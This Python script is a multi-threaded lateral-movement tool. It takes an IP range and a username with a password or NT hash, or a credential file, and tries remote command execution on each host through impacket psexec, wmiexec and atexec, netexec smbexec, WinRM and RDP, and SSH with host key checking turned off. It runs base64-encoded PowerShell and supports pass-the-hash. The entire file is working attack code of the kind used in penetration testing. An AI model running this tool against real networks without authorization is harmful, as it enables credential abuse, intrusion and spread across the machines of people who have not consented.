```py
#!/usr/bin/env python3
import subprocess
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import argparse

EXEC_TIMEOUT = 15
RDP_TIMEOUT = 45
MAX_THREADS = 10

VERBOSE = False
OUTPUT = False

VALID_TOOLS = ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
NXC_TOOLS = ["winrm", "smbexec", "rdp"]

print_lock = threading.Lock()

def colorize(line):
    line = line.replace("[-]", "\033[31m[-]\033[0m")
    line = line.replace("[+]", "\033[32m[+]\033[0m")
    return line

def vprint(msg):
    if VERBOSE:
        with print_lock:
            print(colorize(msg))

def oprint(msg):
    if OUTPUT:
        with print_lock:
            print(colorize(msg))

def safe_print(msg):
    with print_lock:
        print(colorize(msg))

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]

def is_nthash(credential):
    cred = credential.lstrip(':').replace("'", "")
    if len(cred) == 32:
        try:
            int(cred, 16)
            return True
        except ValueError:
            return False
    return False

def escape_quotes(pw):
    out = []
    current = ""
    for i, ch in enumerate(pw):
        if ch != "'":
            current += ch
        else:
            if current:
                out.append(f"'{current}'")
                current = ""
            if i == len(pw) - 1:
                out.append("\\'")
            else:
                out.append("'\\''")
    if current:
        out.append(f"'{current}'")
    return "".join(out)

def quote_if_needed(value):
    if "'" in value:
        return escape_quotes(value)
    return "'" + value + "'"

def load_credential_file(path):
    """
    Load credentials from file with newline-separated format:
    <user1>
    <user1_password>
    <user2>
    <user2_password>
    ...
    
    Blank lines and lines starting with # are ignored.
    For hashes, use the hash directly as the password line.
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.rstrip("\n\r") for line in f]
    except Exception as e:
        print(f"Error: cannot read credential file '{path}': {e}")
        sys.exit(1)
    creds = []
    
    filtered = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            filtered.append(line)
    
    if len(filtered) % 2 != 0:
        raise SystemExit(f"Credential file has odd number of lines ({len(filtered)}). Expected pairs of user/password.")
    
    for i in range(0, len(filtered), 2):
        user = filtered[i].strip()
        cred = filtered[i + 1]
        creds.append((user, cred))
    
    return creds

def normalize_tool_name(name):
    """Normalize tool name aliases to canonical form."""
    name = name.lower().strip()
    if name in ("evilwinrm", "evil-winrm"):
        return "winrm"
    return name

def parse_tools_list(tools_str):
    """Parse comma-separated list of tools, validating each one."""
    tools = []
    for t in tools_str.split(','):
        normalized = normalize_tool_name(t)
        if normalized not in VALID_TOOLS:
            print(f"Error: Invalid tool '{t}'. Valid options: {', '.join(VALID_TOOLS)}")
            sys.exit(1)
        if normalized not in tools:
            tools.append(normalized)
    return tools

def build_cmd(tool, user, target, credential, command, show_output=False):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()
    use_hash = is_nthash(credential)
    hash_val = credential.lstrip(':')
    
    # For nxc tools, add --no-output unless -o was passed
    nxc_output_flag = "" if show_output else " --no-output"

    if tool == "psexec":
        cmd = impacket_cmd("psexec")
        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")

    if tool == "wmiexec":
        cmd = impacket_cmd("wmiexec")
        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")

    if tool == "ssh":
        return f"sshpass -p {credential} ssh -o StrictHostKeyChecking=no {user}@{target} 'powershell -enc {b64}'"

    if tool == "atexec":
        cmd = impacket_cmd("atexec")
        return (f"{cmd} -hashes :{hash_val} {user}@{target} 'powershell -enc {b64}'"
                if use_hash else
                f"{cmd} {user}:{credential}@{target} 'powershell -enc {b64}'")

    if tool == "smbexec":
        return (f"nxc smb {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                if use_hash else
                f"nxc smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")

    if tool == "winrm":
        return (f"nxc winrm {target} -H {hash_val} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}"
                if use_hash else
                f"nxc winrm {target} -p {credential} -u {user} -X 'powershell -enc {b64}'{nxc_output_flag}")

    if tool == "rdp":
        return (f"echo 'y' | nxc rdp {target} -u {user} -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                if use_hash else
                f"echo 'y' | nxc rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")

    raise Exception(f"Unknown tool: {tool}")

def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
    chain = tool_list if tool_list else ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]

    for tool in chain:
        # Can't pass the hash with SSH
        if tool == "ssh" and is_nthash(credential):
            safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
            continue

        cmd = build_cmd(tool, user, ip, credential, command, show_output)
        safe_print(f"[i] Trying {tool}: {cmd}")

        try:
            timeout = RDP_TIMEOUT if tool == "rdp" else EXEC_TIMEOUT
            result = subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):")
            if not out or out == '':
                vprint(f"(no output)")
            else:
                vprint(out)

        except subprocess.TimeoutExpired:
            safe_print(f"  [-] For {ip}: {tool} timed out.")
            continue

        if tool == "psexec" and not "Found writable share" in out:
            safe_print(f"  [-] For {ip}: {tool} failed.")
            continue

        if (tool == "smbexec" or tool == "atexec") and '[-]' in out:
            safe_print(f"  [-] For {ip}: {tool} failed.")
            continue
        
        if (tool == "smbexec" or tool == "rdp") and rc == 0 and out == "":
            safe_print(f"  [-] For {ip}: {tool} failed.")
            continue

        if tool == "rdp":
            if "[-] Clipboard" in out:
                safe_print(f"  [+] For {ip}: {tool} succeeded as {user} with {credential}, but failed to initialize clipboard and run command. Try manually using RDP.")
            elif "[-]" in out:
                safe_print(f"  [-] For {ip}: {tool} failed.")
            continue

        if rc == 0 or (tool == "winrm" and rc == 1):
            return (tool, out, cmd)

        safe_print(f"  [-] For {ip}: {tool} failed.")

    return None

def execute_on_ip(username, ip, credential, command, tool_list=None, show_output=False):
    safe_print(f"[*] Attempting {username}@{ip}...")
    result = run_chain(username, ip, credential, command, tool_list, show_output)

    if result is None:
        safe_print(f"[-] All tools failed for {ip} with {username}.")
        return (ip, None)

    tool, out, cmd = result
    safe_print(f"[+] Success! With command: {cmd}")
    oprint(out)
    return (ip, tool)

def print_usage():
    msg = f"""
Usage:
  python3 exec_across_ips.py [options] <ip_range> <username> <credential> [command]
  python3 exec_across_ips.py [options] <ip_range> -f <credfile> [command]

Options:
  -v                   Verbose output
  -o                   Show successful command output
  -f <credential_list> Use list of provided credentials
  --threads <n>        Number of concurrent threads (default: 10)
  --tools <list>       Comma-separated list of tools to try in order

Valid tools: {', '.join(VALID_TOOLS)}
  Aliases: evilwinrm, evil-winrm -> winrm

Credential file format (newline-separated):
  user1
  user1_password
  user2
  user2_password2

Examples:
  python3 exec_across_ips.py 192.168.1.1-10 admin Password123 whoami
  python3 exec_across_ips.py --tools winrm 10.0.0.5 admin Password123 whoami
  python3 exec_across_ips.py --tools psexec,winrm,wmiexec 10.0.0.1-50 admin Pass123
  python3 exec_across_ips.py --threads 20 192.168.1.0-255 -f creds.txt 'net user'
"""
    print(msg.strip())

def parse_args():
    parser = argparse.ArgumentParser(
        description="Execute commands across an IP range using multiple Windows RCE methods",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("-v", action="store_true", help="Verbose output")
    parser.add_argument("-o", action="store_true", help="Show successful command output")
    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
    parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")

    parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
    parser.add_argument("username", nargs="?", help="Username")
    parser.add_argument("credential", nargs="?", help="Password or NT hash")
    parser.add_argument("command", nargs="*", help="Command to run (default: whoami)")

    args = parser.parse_args()

    if args.file and (args.username or args.credential):
        parser.error("Cannot specify username/password when using -f")

    if not args.file and (not args.username or not args.credential):
        parser.error("Must supply either -f FILE or username + credential")

    return args

IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix

def check_dependencies():
    """Check if required tools are installed."""
    global IMPACKET_PREFIX
    
    # Check nxc
    result = subprocess.run("nxc -h", shell=True, capture_output=True)
    if result.returncode != 0:
        print("[-] nxc not found. Install with: pipx install netexec")
        sys.exit(1)
    
    # Check impacket (either impacket-psexec or psexec.py)
    r1 = subprocess.run("impacket-psexec --help", shell=True, capture_output=True)
    r2 = subprocess.run("psexec.py --help", shell=True, capture_output=True)
    if r1.returncode == 0:
        IMPACKET_PREFIX = "impacket-"
    elif r2.returncode == 0:
        IMPACKET_PREFIX = ""
    else:
        print("[-] impacket not found. Install with: pipx install impacket")
        sys.exit(1)

def impacket_cmd(tool):
    """Return the correct impacket command name based on install type."""
    if IMPACKET_PREFIX:
        return f"impacket-{tool}"
    return f"{tool}.py"

def main():
    global VERBOSE, OUTPUT, MAX_THREADS

    check_dependencies()

    args = parse_args()

    VERBOSE = args.v
    OUTPUT = args.o
    MAX_THREADS = args.threads

    if not OUTPUT:
        print("[*] Run with -o to see successful command output")

    if args.tools:
        tool_list = parse_tools_list(args.tools)
        print(f"[*] Using tools: {', '.join(tool_list)}")
    else:
        tool_list = None

    if args.file:
        credential_list = load_credential_file(args.file)
        command = " ".join(args.command) if args.command else "whoami"
    else:
        credential_list = [(args.username, args.credential)]
        command = " ".join(args.command) if args.command else "whoami"

    if args.ip_range.endswith('.txt'):
        ips = []
        with open(args.ip_range) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    ips.extend(parse_ip_range(line))
    else:
        ips = parse_ip_range(args.ip_range)

    print(f"[*] Loaded {len(credential_list)} credential set(s)")
    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")

    futures = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for ip in ips:
            for (user, cred) in credential_list:
                if not is_nthash(cred):
                    c_user = quote_if_needed(user)
                    c_cred = quote_if_needed(cred)
                else:
                    c_user = user
                    c_cred = cred

                futures.append(
                    executor.submit(execute_on_ip, c_user, ip, c_cred, command, tool_list, OUTPUT)
                )

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Exception: {e}")

if __name__ == "__main__":
    main()
```